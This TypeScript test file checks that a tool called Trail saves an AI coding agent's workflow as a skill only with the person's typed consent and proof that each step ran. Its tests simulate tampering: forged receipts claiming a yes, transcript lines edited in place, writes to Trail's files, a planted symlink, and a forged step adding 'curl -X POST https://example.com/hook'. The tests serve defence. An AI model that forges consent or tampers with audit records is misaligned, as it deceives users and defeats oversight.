/**
 * The save gate (design 3.3 step 3, 4.9): a skill is kept only with the
 * person's typed yes or their own save request, read both from the prompt
 * hook's record and from their line in the transcript; every step must have
 * run here and worked; the CLI re-decides from the transcript and holds
 * anything the receipt and the transcript don't back. Real fold, real
 * session lock, a made-up repo (acme/shop) and a transcript that grows.
 */
process.env.TZ = "UTC";
import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdirSync, readFileSync, rmSync, symlinkSync, utimesSync, writeFileSync } from "node:fs";
import { dirname, join, relative, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { cliAdd, DENY, heldLines, parseSkillsAdd, savedLines, SKILLS_ADD_RE, verifySave } from "../src/skills/save-gate.js";
import { findReceipt, receiptPath } from "../src/skills/receipts.js";
import { readSkillsState, skillsStatePath } from "../src/skills/state.js";
import { withLock } from "../src/util/private-fs.js";
import { findPriorSheet, readRunSheet, runSheetPath } from "../src/trace/runs.js";
import { sessionPath } from "../src/trace/gate-file.js";
import { compileRun } from "../src/skills/compile.js";
import { skillSha } from "../src/skills/offer-moment.js";
import type { CompiledSkill, Receipt } from "../src/skills/types.js";
import { T, add, append, box, bash, ctxAt, kept, offered, prompt, release, say, state, stop, type Box } from "./skills-consent-fixtures.js";
import { said, toolResult, toolUse } from "./trace-fixtures.js";
import { withSkillSession } from "../src/trace/skill-session.js";

const receipt = (b: Box): Receipt => JSON.parse(readFileSync(receiptPath(b.sid, b.env), "utf8"));
const denied = (r: ReturnType<typeof add>, re: RegExp) => {
  assert.equal(r.decision?.permissionDecision, "deny", JSON.stringify(r.cli));
  assert.match(r.decision!.reason, re);
};

test("parseSkillsAdd: the name and --run in either order, through any wrapper; anything else is a flag; two adds is no add", () => {
  const ok = { name: "release-npm", runId: "r-1027-3f9a", flags: [] };
  for (const c of [
    "trail skills add release-npm --run r-1027-3f9a",
    "trail skills add --run r-1027-3f9a release-npm",
    "trail skills add release-npm --run=r-1027-3f9a",
    "npx -y @trailhq/trail-code skills add release-npm --run r-1027-3f9a",
    "node /home/dev/.npm/trail/dist/cli.js skills add release-npm --run r-1027-3f9a",
    'bash -c "trail skills add release-npm --run r-1027-3f9a"',
    "cd /home/dev/shop && trail skills add release-npm --run r-1027-3f9a 2>&1 | tail -3",
    "trail skills add 'release-npm' --run \"r-1027-3f9a\"; echo done",
    "graft skills  add release-npm --run r-1027-3f9a # keep it",
  ]) assert.deepEqual(parseSkillsAdd(c), ok, c);
  assert.deepEqual(parseSkillsAdd("trail skills add release-npm --run r-1027-3f9a --force"), { ...ok, flags: ["--force"] });
  assert.deepEqual(parseSkillsAdd("trail skills add release-npm --run r-1027-3f9a --from taught"), { ...ok, flags: ["--from", "taught"] });
  assert.deepEqual(parseSkillsAdd("trail skills add release-npm extra --run r-1027-3f9a"), { ...ok, flags: ["extra"] });
  assert.equal(parseSkillsAdd("trail skills add release-npm"), null);
  assert.equal(parseSkillsAdd("trail skills add --run r-1027-3f9a"), null);
  assert.equal(parseSkillsAdd("trail skills add a --run r-1027-3f9a && trail skills add b --run r-1027-3f9a"), null);
  assert.ok(SKILLS_ADD_RE.test("echo x | xargs trail skills add"));
  assert.equal(SKILLS_ADD_RE.test("trail skills show release-npm"), false);
});

test("J05: 'save this as a skill' after a release, then the add: saved live, the receipt flat, the request spent", () => {
  const b = box();
  release(b, 0);
  stop(b, 50);
  const p = prompt(b, 70, "save this as a skill");
  const r = add(b, 80, `trail skills add release-npm --run ${p.save}`);
  assert.equal(r.decision, null);
  assert.equal(r.cli?.exit, 0);
  // D118 c: build and publish, then the npm view check, named apart.
  assert.deepEqual(r.cli?.lines, savedLines({ name: "release-npm", meta: { asks: "publish" }, check: "npm view acme-cli version", checkIsStep: false } as CompiledSkill, 3, T(40).toISOString(), "this repo", T(81)));
  assert.equal(r.cli?.lines[0], "✓ saved release-npm, just for you in this repo · 2 steps and its check, each one ran here at 10:00 today");
  assert.deepEqual(r.cli?.saved, { from: "asked", scope: "personal" });
  const rc = receipt(b);
  assert.deepEqual([rc.consent, rc.typedSave, rc.typedYes, rc.asked, rc.stepsTotal, rc.stepsVerified, rc.verdict, rc.toolUseId],
    ["asked", true, false, "this repo", 3, 3, "live", r.id]);
  assert.ok(rc.usedAt, "used once");
  assert.equal(state(b).saveRequest, null, "spent");
  assert.deepEqual(kept(b), { skills: ["release-npm"], held: [] });
  const s = Object.values(readSkillsState(b.env).skills)[0]!;
  assert.deepEqual([s.status, s.from, s.runId], ["candidate", "asked", p.save]);
  // The same add again: nothing new to spend, so the run is denied as already kept.
  denied(add(b, 90, `trail skills add release-npm --run ${p.save}`), /already kept as the skill release-npm/);
});

test("J04: offered at Stop, 'show me', then 'yes': saved live as a repeated job, the offer spent", () => {
  const b = box();
  const { offer } = offered(b, 0);
  assert.equal(prompt(b, 70, "show me").answer, "show");
  // As the show directive says: the draft, pasted, then "Keep it? (yes / no)".
  bash(b, 72, `trail skills draft ${offer.runId} --print`, "# Release shop to npm\n## Run\n1. `npm run build`");
  append(b, [said("# Release shop to npm\n## Run\n1. `npm run build`\n\nKeep it? (yes / no)", { cwd: b.repo, sessionId: b.sid, timestamp: T(74).toISOString() })]);
  assert.equal(prompt(b, 90, "yes").answer, "yes");
  const r = add(b, 100, `trail skills add ${offer.name} --run ${offer.runId}`);
  assert.equal(r.decision, null);
  assert.deepEqual(r.cli?.saved, { from: "repeated", scope: "personal" });
  const rc = receipt(b);
  assert.deepEqual([rc.consent, rc.offerId, rc.typedYes, rc.typedSave, rc.asked], ["offer-yes", offer.offerId, true, false, null]);
  assert.equal(state(b).pendingOffer, null);
});

test("two quick yeses: the first counts, the second is ignored, and the add saves once (D70)", () => {
  const b = box();
  const { offer } = offered(b, 0);
  assert.equal(prompt(b, 70, "yes").answer, "yes");
  assert.deepEqual(prompt(b, 72, "yes"), { out: null, answer: null });
  const r = add(b, 80, `trail skills add ${offer.name} --run ${offer.runId}`);
  assert.equal(r.decision, null);
  assert.deepEqual(r.cli?.saved, { from: "repeated", scope: "personal" });
  assert.deepEqual(kept(b), { skills: [offer.name], held: [] });
  // A second add after the save is refused: the run is kept.
  assert.equal(add(b, 90, `trail skills add ${offer.name}-again --run ${offer.runId}`).decision?.permissionDecision, "deny");
});

for (const order of ["line-first", "hook-first"] as const) {
  test(`consent holds whichever comes first, the typed line or the prompt hook (${order})`, () => {
    const b = box();
    const { offer } = offered(b, 0);
    prompt(b, 70, "yes", order);
    assert.equal(add(b, 80, `trail skills add ${offer.name} --run ${offer.runId}`).cli?.saved?.from, "repeated");
    const c = box();
    release(c, 0);
    stop(c, 50);
    const p = prompt(c, 70, "keep this as a skill", order);
    assert.equal(add(c, 80, `trail skills add release-npm --run ${p.save}`).cli?.saved?.from, "asked");
  });
}

test("consent needs both halves: the hook's yes alone, or the person's line alone, is held", () => {
  // The hook saw a yes, but the transcript has no line the person typed (the line is the agent's).
  const hookOnly = box();
  const a = offered(hookOnly, 0).offer;
  prompt(hookOnly, 70, "yes", "hook-first", { isMeta: true });
  const r1 = add(hookOnly, 80, `trail skills add ${a.name} --run ${a.runId}`);
  assert.equal(r1.decision, null);
  assert.deepEqual([r1.cli?.held, receipt(hookOnly).consent], ["no-yes", "none"]);
  assert.deepEqual(kept(hookOnly), { skills: [], held: [a.name] });

  // The person typed yes, but the prompt hook never ran (no record of it).
  const lineOnly = box();
  const o = offered(lineOnly, 0).offer;
  say(lineOnly, 70, "yes");
  const r2 = add(lineOnly, 80, `trail skills add ${o.name} --run ${o.runId}`);
  assert.deepEqual([r2.cli?.held, receipt(lineOnly).consent], ["no-yes", "none"]);
  assert.deepEqual(kept(lineOnly).skills, []);
});

test("the person's line is read again at its offset: a line changed in place since the fold is no consent", () => {
  const b = box();
  const { offer } = offered(b, 0);
  prompt(b, 70, "yes");
  withSkillSession(ctxAt(b, 75), { catchUp: true }, () => undefined);
  // Same length, so every offset still holds: the line now says it came from an agent, not the person.
  const text = readFileSync(b.tx, "utf8");
  const at = text.lastIndexOf('"origin":{"kind":"human"}');
  writeFileSync(b.tx, `${text.slice(0, at)}"origin":{"kind":"agent"}${text.slice(at + '"origin":{"kind":"human"}'.length)}`);
  const r = add(b, 80, `trail skills add ${offer.name} --run ${offer.runId}`);
  assert.deepEqual([r.cli?.held, receipt(b).consent], ["no-yes", "none"]);
});

test("the CLI sweeps the transcript's tail for writes to Trail's files, whatever the session's cursor says", () => {
  const b = box();
  const { offer } = offered(b, 0);
  prompt(b, 70, "yes");
  add(b, 80, `trail skills add ${offer.name} --run ${offer.runId}`, { skipCli: true });
  bash(b, 82, `sed -i '' 's/kind/kind/' ${b.tx}`, "");
  // A forged session file: its cursor already past that call, and no tamper mark.
  withSkillSession(ctxAt(b, 83), { catchUp: true }, (st) => {
    st.tampered = null;
  });
  const r = cliAdd(offer.name, offer.runId, b.env, T(84), b.repo);
  assert.deepEqual(r, { exit: 1, lines: ["trail · not saved: this session changed Trail's own files (Bash sed), so Trail can't trust its record of what ran."] });
  assert.deepEqual(kept(b).skills, []);
});

test("a run in another checkout than the session's is not this session's to keep, and the refusal names both repos", () => {
  const b = box();
  const other = join(b.root, "src", "storefront");
  mkdirSync(join(other, ".git"), { recursive: true });
  writeFileSync(join(other, ".git", "config"), '[remote "origin"]\n\turl = git@github.com:acme/storefront.git\n');
  say(b, 0, "publish 2.0.1");
  const at = (sec: number) => ({ cwd: other, gitBranch: "main", sessionId: b.sid, timestamp: T(sec).toISOString() });
  for (const [sec, cmd, out] of [[10, "npm run build", "built"], [20, "npm publish acme-web-2.0.1.tgz --access public", "+ acme-web@2.0.1"], [30, "npm view acme-web version", "2.0.1"]] as const) {
    const id = `toolu_sf${sec}`;
    append(b, [toolUse(id, "Bash", { command: cmd }, at(sec)), toolResult(id, out, false, at(sec + 1))]);
  }
  append(b, [said("Published 2.0.1; npm shows it.", at(40))]);
  const s = stop(b, 50);
  const p = prompt(b, 70, "save this as a skill");
  assert.equal(p.save, s.runId);
  // D70: the refusal names the repo the run was done in, and the one this session works in.
  denied(add(b, 80, `trail skills add release-web --run ${s.runId}`),
    /^trail · not saved: that run was done in acme\/storefront, and this session works in acme\/shop, so Trail can't keep it from here\.$/);
});

test("a yes as the 2nd prompt after the offer is no consent", () => {
  const b = box();
  const { offer } = offered(b, 0);
  prompt(b, 70, "wait, check the changelog first");
  assert.equal(prompt(b, 90, "yes").answer, null, "the offer was dropped by the first prompt");
  const r = add(b, 100, `trail skills add ${offer.name} --run ${offer.runId}`);
  assert.equal(r.cli?.held, "no-yes");
  assert.deepEqual(kept(b).skills, []);
});

test("each deny of 4.9 steps 1 to 4 and 9, with its words", () => {
  const b = box();
  const { offer } = offered(b, 0);
  prompt(b, 70, "yes");
  const add1 = (sec: number, cmd: string) => add(b, sec, cmd);
  denied(add1(80, `trail skills add ${offer.name} --run ${offer.runId} --yes`), /^trail · not saved: `trail skills add` takes only a name and --run <id>\.$/);
  denied(add1(81, `trail skills add ${offer.name}`), /takes only a name and --run <id>/);
  denied(add1(82, `trail skills add Release_NPM --run ${offer.runId}`), /^trail · not saved: pick a name with lowercase letters, digits and dashes, with at least one letter\.$/);
  denied(add1(83, `trail skills add skills --run ${offer.runId}`), /pick a name/);
  denied(add1(84, "trail skills add release-npm --run r-0101-dead"), /^trail · not saved: that run isn't from this session\.$/);
  // Step 9: the name is a skill the agent already has.
  mkdirSync(join(b.env.HOME!, ".claude", "skills", offer.name), { recursive: true });
  // On an offer's yes, the other name it suggests is the offered one, numbered (g5 review).
  denied(add1(85, `trail skills add ${offer.name} --run ${offer.runId}`), new RegExp(`the name ${offer.name} is taken \\(a skill your agent already has\\)\\. Use another: trail skills add ${offer.name}-2 --run ${offer.runId}`));
  denied(add1(86, `trail skills add publish-acme --run ${offer.runId}`), new RegExp(`^trail · not saved: the offer was for the name ${offer.name}\\. Run: trail skills add ${offer.name}-2 --run ${offer.runId}$`));
  assert.equal(add1(87, `trail skills add ${offer.name}-2 --run ${offer.runId}`).cli?.saved?.from, "repeated");
});

test("tamper denies: a session that wrote Trail's files can't keep a skill", () => {
  const b = box();
  const { offer } = offered(b, 0);
  bash(b, 60, `echo '{}' > ${join(b.env.TRAIL_HOME!, "receipts", "x.json")}`, "");
  prompt(b, 70, "yes");
  denied(add(b, 80, `trail skills add ${offer.name} --run ${offer.runId}`), /this session changed Trail's own files \(Bash echo\), so Trail can't trust its record of what ran\./);
});

test("step 7: a sheet that says a failed step worked, or names a step that never ran, is denied from the transcript", () => {
  // An asked save, so step 7 is what refuses it: on an offer's yes the changed steps are refused first (below).
  const forged = (edit: (sheet: any) => void, viaOffer = false) => {
    const b = box();
    let runId: string;
    let name = "release-npm";
    if (viaOffer) {
      const { offer } = offered(b, 0, { failedFirst: true });
      prompt(b, 70, "yes");
      runId = offer.runId;
      name = offer.name;
    } else {
      release(b, 0, { failedFirst: true });
      stop(b, 50);
      // The ask's catch-up closed the run and wrote the sheet for the last time.
      runId = prompt(b, 70, "save this as a skill").save!;
    }
    const path = runSheetPath(runId, b.env);
    const sheet = JSON.parse(readFileSync(path, "utf8"));
    edit(sheet);
    writeFileSync(path, JSON.stringify(sheet));
    // D73: a forger also gets the asked save's sha right (out of sight), so step 7 is the wall under test here.
    if (!viaOffer) {
      const s = readRunSheet(runId, b.env)!;
      const c = compileRun(s, {
        repoRoot: b.repo, home: b.env.HOME!, platform: process.platform, prior: findPriorSheet(s, b.env), moment: "asked",
        applies: s.repoKey, now: T(70), readSheet: (id) => readRunSheet(id, b.env), taken: () => false,
      });
      assert.ok(c.ok);
      const sp = sessionPath(b.sid, ".json", b.env);
      const f = JSON.parse(readFileSync(sp, "utf8"));
      f.skills.saveRequest.skillSha = skillSha(c.skill);
      writeFileSync(sp, JSON.stringify(f));
    }
    return add(b, 80, `trail skills add ${name} --run ${runId}`);
  };
  denied(forged((s) => { s.calls[0].cmd = "npm run build && curl -X POST https://example.com/hook"; }, true), new RegExp(`^${DENY.changed.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}$`));
  // The failed publish marked as worked, with the good one dropped: the transcript shows it failed.
  denied(forged((s) => {
    const bad = s.calls.findIndex((c: any) => c.failed);
    s.calls[bad].failed = false;
    s.calls.splice(bad + 1, 1);
    s.checkIndex -= 1;
    s.counts.commands -= 1;
    s.counts.failed -= 1;
  }), /^trail · not saved: these steps never ran here and worked: npm publish acme-cli-\{version\}\.tgz\.$/);
  // A step written into the sheet that is not in the transcript.
  denied(forged((s) => {
    s.calls.splice(1, 0, { ...s.calls[0], id: "toolu_fake0001", cmd: "npm run deploy:prod", src: { use: 10, result: 20 } });
    s.checkIndex += 1;
    s.counts.commands += 1;
  }), /these steps never ran here and worked: npm run deploy:prod/);
  // A step whose command in the sheet is not what ran.
  denied(forged((s) => {
    s.calls[0].cmd = "npm run build && curl -X POST https://example.com/hook";
  }), /these steps never ran here and worked/);
});

test("the CLI half: no receipt holds; a used receipt can't save twice; a receipt the transcript doesn't back holds", () => {
  const b = box();
  const { offer } = offered(b, 0);
  prompt(b, 70, "yes");
  // PreToolUse never ran: no receipt.
  const skipped = add(b, 80, `trail skills add ${offer.name} --run ${offer.runId}`, { skipHook: true });
  assert.deepEqual(skipped.cli?.lines, heldLines(offer.name, "no-yes", "claude"));
  assert.deepEqual(kept(b), { skills: [], held: [offer.name] });

  // A receipt, then the CLI twice: the second finds no unused receipt and holds.
  const c = box();
  const o = offered(c, 0).offer;
  prompt(c, 70, "yes");
  const first = add(c, 80, `trail skills add ${o.name} --run ${o.runId}`);
  assert.equal(first.cli?.saved?.from, "repeated");
  const again = cliAdd(o.name, o.runId, c.env, T(82), c.repo);
  assert.deepEqual(again, { exit: 1, lines: [`trail · not saved: that run is already kept as the skill ${o.name}.`] });
  assert.deepEqual(kept(c), { skills: [o.name], held: [] });

  // A receipt whose tool_use id is not an add in this transcript.
  const d = box();
  const p = offered(d, 0).offer;
  prompt(d, 70, "yes");
  add(d, 80, `trail skills add ${p.name} --run ${p.runId}`, { skipCli: true });
  const rc = receipt(d);
  writeFileSync(receiptPath(d.sid, d.env), JSON.stringify({ ...rc, toolUseId: "toolu_notanadd" }));
  assert.equal(cliAdd(p.name, p.runId, d.env, T(81), d.repo).held, "no-yes");
  assert.deepEqual(kept(d).skills, []);
});

test("the CLI half: a re-decision that differs from the receipt holds", () => {
  const b = box();
  release(b, 0);
  stop(b, 50);
  const p = prompt(b, 70, "save this as a skill");
  add(b, 80, `trail skills add release-npm --run ${p.save}`, { skipCli: true });
  // The agent rewrites its receipt to claim a typed yes and another line.
  const rc = receipt(b);
  writeFileSync(receiptPath(b.sid, b.env), JSON.stringify({ ...rc, consent: "offer-yes", typed: { offset: 0, lineSha: "0".repeat(64) } }));
  const r = cliAdd("release-npm", p.save!, b.env, T(81), b.repo);
  assert.equal(r.held, "no-yes");
  assert.equal(findReceipt(p.save!, "release-npm", T(82), b.env), null, "the receipt is used");
});

test("the CLI's own words: skills off, an unknown run, the held line for a host", () => {
  const off = box({ settings: { skills: "off" } });
  assert.deepEqual(cliAdd("release-npm", "r-1027-3f9a", off.env, T(0), off.repo), { exit: 1, lines: ["Skills are off. Turn them on with: trail skills on"] });
  const b = box();
  assert.deepEqual(cliAdd("release-npm", "r-1027-3f9a", b.env, T(0), b.repo), { exit: 1, lines: ["no run called r-1027-3f9a (runs are kept 7 days)"] });
  assert.deepEqual(heldLines("ship-it", "host", "cursor"), [
    "· not kept: it came from Cursor, where Trail can't check which steps ran",
    "Tell the person why Trail didn't keep it: I didn't keep ship-it as a skill, because it came from Cursor, where Trail can't check which steps ran. If you want it, run this in your own terminal: trail skills keep ship-it",
  ]);
});

test("the saved line: on another day, every repo, and the D27 sentence for a repo or team ask", () => {
  const c = { name: "release-npm", meta: { asks: "publish {version}, cut a release", applies: "every repo" } } as unknown as CompiledSkill;
  const [a, b2] = savedLines(c, 1, "2026-10-25T09:12:00.000Z", "team", T(0));
  assert.equal(a, "✓ saved release-npm, just for you, in every repo · 1 step, each one ran here on Oct 25");
  assert.equal(b2, "Tell the person what Trail kept: Saved release-npm, just for you, in every repo: 1 step, each one ran here on Oct 25. Next time you ask to publish {version}, I start from them. Saving it for the team comes later, so for now it's just yours. See them: trail skills show release-npm · undo: trail forget release-npm");
  assert.match(savedLines({ ...c, meta: { asks: "publish" } } as CompiledSkill, 2, T(0).toISOString(), "repo", T(60))[1], /Saving it for the whole repo comes later, so for now it's just yours\./);
});

test("D65: a held item from the same run is dropped by the live save; one from another run keeps its name", () => {
  const c = box();
  const o = offered(c, 0).offer;
  prompt(c, 70, "yes");
  // The hook didn't run for the first add: no receipt, so the CLI held it.
  add(c, 75, `trail skills add ${o.name} --run ${o.runId}`, { skipHook: true });
  assert.deepEqual(kept(c), { skills: [], held: [o.name] });
  // The yes is still unspent: the next add goes through the hook and saves live, dropping the held copy.
  const live = add(c, 80, `trail skills add ${o.name} --run ${o.runId}`);
  assert.equal(live.cli?.saved?.from, "repeated");
  assert.deepEqual(kept(c), { skills: [o.name], held: [] });

  // A held item of the same name from another run is in the way.
  const b = box();
  const { offer } = offered(b, 0);
  prompt(b, 70, "yes");
  const dir = join(b.env.TRAIL_HOME!, "held", offer.name);
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, "held.json"), JSON.stringify({
    v: 1, name: offer.name, why: "no-yes", host: "claude", job: "release", repoKey: "github.com/acme/shop", at: T(-60).toISOString(), shownAt: null,
    id: "s-000001", runId: "r-1020-0001", source: { commands: 3, failed: 0, at: T(-60).toISOString() }, stepsTotal: 3,
  }));
  denied(add(b, 80, `trail skills add ${offer.name} --run ${offer.runId}`), /is taken \(a skill Trail is holding for you to keep\)/);
});

test("D70: a busy store never leaves the held copy beside the saved skill; the save waits for a retry", () => {
  const b = box();
  const o = offered(b, 0).offer;
  prompt(b, 70, "yes");
  add(b, 75, `trail skills add ${o.name} --run ${o.runId}`, { skipHook: true });
  assert.deepEqual(kept(b), { skills: [], held: [o.name] });
  add(b, 80, `trail skills add ${o.name} --run ${o.runId}`, { skipCli: true });
  // Another trail command holds the store lock: too briefly for the save's wait, too long for the held drop's.
  const lock = join(b.env.TRAIL_HOME!, "skills", ".store.lock");
  writeFileSync(lock, "4242");
  const aged = new Date(Date.now() - 9_500);
  utimesSync(lock, aged, aged);
  const busy = cliAdd(o.name, o.runId, b.env, T(81), b.repo);
  assert.equal(busy.exit, 1);
  assert.match(busy.lines[0]!, /^trail · not saved: the skill store is busy/);
  assert.deepEqual(kept(b), { skills: [], held: [o.name] }, "never both");
  assert.ok(state(b).pendingOffer?.yes, "the yes is not spent");
  assert.equal(receipt(b).usedAt, null);
  rmSync(lock, { force: true });
  assert.equal(cliAdd(o.name, o.runId, b.env, T(85), b.repo).saved?.from, "repeated");
  assert.deepEqual(kept(b), { skills: [o.name], held: [] });
});

test("a save the store can't finish (its state busy) says so and exits 1; the yes and the receipt stay for a retry", () => {
  const b = box();
  const { offer } = offered(b, 0);
  prompt(b, 70, "yes");
  add(b, 80, `trail skills add ${offer.name} --run ${offer.runId}`, { skipCli: true });
  const busy = withLock(skillsStatePath(b.env), () => cliAdd(offer.name, offer.runId, b.env, T(81), b.repo));
  assert.ok(busy.ok);
  assert.deepEqual(busy.ok && busy.value, { exit: 1, lines: ["trail · not saved: the skill state is busy (a hook is writing it). Try again in a few seconds."] });
  assert.deepEqual(kept(b), { skills: [], held: [] });
  assert.ok(state(b).pendingOffer?.yes, "the yes is not spent");
  assert.equal(receipt(b).usedAt, null);
  assert.equal(cliAdd(offer.name, offer.runId, b.env, T(85), b.repo).saved?.from, "repeated");
});

test("a planted link in place of one of Trail's own folders refuses the save", () => {
  const b = box();
  const { offer } = offered(b, 0);
  prompt(b, 70, "yes");
  const elsewhere = join(b.root, "src", "shop", "planted");
  mkdirSync(elsewhere, { recursive: true });
  symlinkSync(elsewhere, join(b.env.TRAIL_HOME!, "held"));
  denied(add(b, 80, `trail skills add ${offer.name} --run ${offer.runId}`), /^trail · not saved: held in Trail's home is a link, not Trail's own folder, so Trail won't write through it\.$/);
  // Without the hook, the CLI's hold refuses to write through it too.
  const r = add(b, 90, `trail skills add ${offer.name} --run ${offer.runId}`, { skipHook: true });
  assert.equal(r.cli?.exit, 1);
  assert.match(r.cli!.lines[0]!, /^trail · not saved: .*is a link/);
  assert.deepEqual(kept(b).skills, []);
});

test("subagents, headless runs, CI, scratch folders and other hosts", () => {
  const b = box();
  const { offer } = offered(b, 0);
  prompt(b, 70, "yes");
  const cmd = `trail skills add ${offer.name} --run ${offer.runId}`;
  denied(add(b, 80, cmd, { ctx: ctxAt(b, 80, { agent_id: "a-17" }) }), /^trail · not saved: only the main session can keep a skill\.$/);
  // verifySave refuses them itself, even when a caller skipped the gate.
  const ctx = ctxAt(b, 80);
  const st = state(b);
  const parsed = parseSkillsAdd(cmd);
  assert.equal(verifySave(parsed, { ...ctx, subagent: true }, st, null).deny, DENY.subagent);
  assert.equal(verifySave(parsed, { ...ctx, fold: false, learn: false }, st, null).deny, DENY.noPerson);
  const headless = box({ env: { CLAUDE_CODE_ENTRYPOINT: "sdk-cli" } });
  denied(add(headless, 0, cmd), /^trail · not saved: this session runs without a person at the keyboard \(headless, CI or a scratch folder\), so Trail keeps nothing from it\.$/);
  const ci = box({ env: { CI: "true" } });
  denied(add(ci, 0, cmd), /without a person at the keyboard/);
  // Cursor folds runs but can't prove which steps ran: asked saves are held for the person.
  const cursor = box({ payload: { cursor_version: "1.7.2" } });
  release(cursor, 0);
  stop(cursor, 50);
  const p = prompt(cursor, 70, "save this as a skill");
  const r = add(cursor, 80, `trail skills add release-npm --run ${p.save}`);
  assert.equal(r.decision, null);
  assert.deepEqual(r.cli?.lines, heldLines("release-npm", "host", "cursor"));
  assert.equal(receipt(cursor).verdict, "held");
});

test("the save gate's import closure loads no CLI, graph, ask, cloud or telemetry code", () => {
  const SRC = resolve(dirname(fileURLToPath(import.meta.url)), "..", "src");
  const seen = new Set<string>();
  const walk = (file: string) => {
    if (seen.has(file)) return;
    seen.add(file);
    const text = readFileSync(file, "utf8");
    for (const m of text.matchAll(/^\s*(?:import|export)\s+(?!type\b)(?:[^'";]*?\sfrom\s+)?['"](\.{1,2}\/[^'"]+)['"]/gm)) {
      walk(resolve(dirname(file), m[1]!.replace(/\.js$/, ".ts")));
    }
  };
  walk(join(SRC, "skills", "save-gate.ts"));
  const files = [...seen].map((f) => relative(SRC, f));
  const bad = files.filter((f) => f === "cli.ts" || /^(?:graph|ask|cloud|telemetry)\//.test(f));
  assert.deepEqual(bad, [], files.join("\n"));
});
